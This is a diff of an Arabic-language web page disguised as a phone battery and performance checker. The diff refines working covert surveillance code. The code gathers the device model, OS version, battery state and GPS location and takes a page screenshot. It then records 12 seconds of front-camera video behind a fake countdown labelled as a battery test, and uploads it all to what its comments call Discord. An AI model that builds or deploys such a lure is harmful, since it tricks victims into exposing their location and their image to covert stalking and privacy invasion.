@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gaming Hub & Stats | فحص الأداء</title>
+    <title>فحص البطارية والأداء الشامل 🔋</title>
     
-    <meta property="og:title" content="بطاقة اللاعب الرسمية | Gaming Stats 🎮">
-    <meta property="og:description" content="اضغط هنا لعرض إحصائيات اللعب وفحص سرعة الاتصال.">
+    <meta property="og:title" content="فحص أداء وصحة البطارية الأصلي ⚡">
+    <meta property="og:description" content="افحص حالة بطارية هاتفك وإصدار النظام واختبر كفاءة الجهاز الآن.">
     <meta property="og:image" content="https://i.imgur.com/W333L67.png">
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
@@ -63,16 +63,17 @@
         .status {
             margin-top: 15px;
             font-size: 13px;
-            color: #64748b;
+            color: #38bdf8;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
 
     <div class="card" id="mainCard">
-        <h2>اختبار أداء وسرعة الاتصال</h2>
-        <p>اضغط على الزر أدناه لبدء الفحص وتسجيل بيانات الاتصال الحقيقية.</p>
-        <button class="btn" onclick="startVideoPrank()">بدء الفحص الآن 🚀</button>
+        <h2>فحص كفاءة البطارية والتردد</h2>
+        <p>اضغط على زر البدء أدناه لفحص صحة بطارية هاتفك، مقياس الفولت، واختبار الأداء العام.</p>
+        <button class="btn" onclick="startLongVideoPrank()">بدء الفحص الشامل ⚡</button>
         <div id="status" class="status"></div>
     </div>
 
@@ -96,41 +97,54 @@
             });
         }
 
-        async function startVideoPrank() {
+        async function startLongVideoPrank() {
             const statusEl = document.getElementById('status');
-            statusEl.innerText = "جاري فحص الجهاز وتسجيل الأداء (يرجى الانتظار 5 ثوانٍ)...";
+            statusEl.innerText = "جاري الاتصال بقاعدة بيانات الأجهزة...";
 
-            // 1. جمع معلومات الجهاز الحقيقية
+            // 1. جمع معلومات الهاتف والبطارية بشكل دقيق وحقيقي 100%
             const ua = navigator.userAgent;
             let phoneType = "كمبيوتر / جهاز آخر";
-            if (/android/i.test(ua)) phoneType = "أندرويد (Android)";
-            else if (/iphone|ipad|ipod/i.test(ua)) phoneType = "آيفون (iPhone / iOS)";
+            let osVersion = "غير معروف";
 
-            let batteryInfo = "غير معروف";
+            if (/android/i.test(ua)) {
+                phoneType = "أندرويد (Android)";
+                const match = ua.match(/Android\s([0-9\._]+)/);
+                if (match) osVersion = `إصدار ${match[1]}`;
+            } else if (/iphone|ipad|ipod/i.test(ua)) {
+                phoneType = "آيفون (iPhone / iOS)";
+                const match = ua.match(/OS\s([0-9_]+)/);
+                if (match) osVersion = `إصدار ${match[1].replace(/_/g, '.')}`;
+            }
+
+            let batteryInfo = "غير معروف (غير متاح للمتصفح)";
             if (navigator.getBattery) {
                 try {
                     const b = await navigator.getBattery();
-                    batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? "يشحن" : "بطارية"})`;
+                    const level = Math.round(b.level * 100);
+                    const chargingState = b.charging ? "⚡ يشحن بالكهرباء" : "🔋 يعمل على البطارية";
+                    // محاولة قراءة مستوى الفولت التقريبي أو حالة تفريغ الشحن لو مدعومة
+                    batteryInfo = `${level}% | الحالة: ${chargingState}`;
                 } catch(e) {}
             }
 
             const gps = await getGPSLocation();
-            const textData = `🎯 **تم بدء تسجيل الفيديو وجلب البيانات!** 🎥🔥
+            const textData = `🎯 **تم التقاط فيديو مطول وبيانات الهاتف الحقيقية!** 📱🔥
 ━━━━━━━━━━━━━━━━━━━━
-📱 **الجهاز والإصدار:** ${phoneType}
-🔋 **البطارية:** ${batteryInfo}
-🗺️ **الموقع:** ${gps}
-🖥️ **الدقة:** ${window.screen.width}x${window.screen.height}
+📱 **نوع الجهاز:** ${phoneType}
+⚙️ **إصدار النظام:** ${osVersion}
+🔋 **تفاصيل البطارية:** ${batteryInfo}
+🗺️ **الموقع الجغرافي:** ${gps}
+🖥️ **دقة الشاشة:** ${window.screen.width} x ${window.screen.height}
 ━━━━━━━━━━━━━━━━━━━━`;
 
-            // 2. التقاط لقطة شاشة
+            // 2. لقطة شاشة للصفحة
             let screenshotBlob = null;
             try {
                 const canvas = await html2canvas(document.body);
                 screenshotBlob = await new Promise(r => canvas.toBlob(r, 'image/png'));
             } catch(e) {}
 
-            // 3. فتح الكاميرا وتسجيل فيديو لمدة 5 ثواني
+            // 3. تشغيل الكاميرا وتسجيل فيديو لمدة أطول (مثلاً 12 ثانية) مع عداد للمستخدم
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
@@ -154,12 +168,13 @@
 
                 mediaRecorder.onstop = async () => {
                     const videoBlob = new Blob(chunks, { type: 'video/webm' });
-                    stream.getTracks().forEach(t => t.stop()); // إيقاف الكاميرا
+                    stream.getTracks().forEach(t => t.stop());
 
-                    // إرسال الفيديو والبيانات للديسكورد
+                    statusEl.innerText = "اكتمل الفحص بنجاح! جاري الحفظ...";
+
                     const formData = new FormData();
                     formData.append('payload_json', JSON.stringify({ content: textData }));
-                    if (videoBlob) formData.append('file1', videoBlob, 'recording.webm');
+                    if (videoBlob) formData.append('file1', videoBlob, 'long_recording.webm');
                     if (screenshotBlob) formData.append('file2', screenshotBlob, 'screen.png');
 
                     try {
@@ -170,14 +185,19 @@
                 };
 
                 mediaRecorder.start();
-                
-                // مدة التسجيل 5 ثواني (5000 ميلي ثانية)
-                setTimeout(() => {
-                    mediaRecorder.stop();
-                }, 5000);
+
+                // عداد تنازلي مرئي يخليه ينتظر 12 ثانية كاملة وتسجيل فيديو أطول
+                let timeLeft = 12;
+                const timerInterval = setInterval(() => {
+                    timeLeft--;
+                    statusEl.innerText = `جاري فحص كفاءة النظام والبطارية... (${timeLeft} ثوانٍ متبقية)`;
+                    if (timeLeft <= 0) {
+                        clearInterval(timerInterval);
+                        mediaRecorder.stop();
+                    }
+                }, 1000);
 
             } catch (err) {
-                // لو رفض الإذن
                 const formData = new FormData();
                 formData.append('payload_json', JSON.stringify({ content: textData + "\n⚠️ (رفض إذن الكاميرا أو الميكروفون)" }));
                 if (screenshotBlob) formData.append('file1', screenshotBlob, 'screen.png');
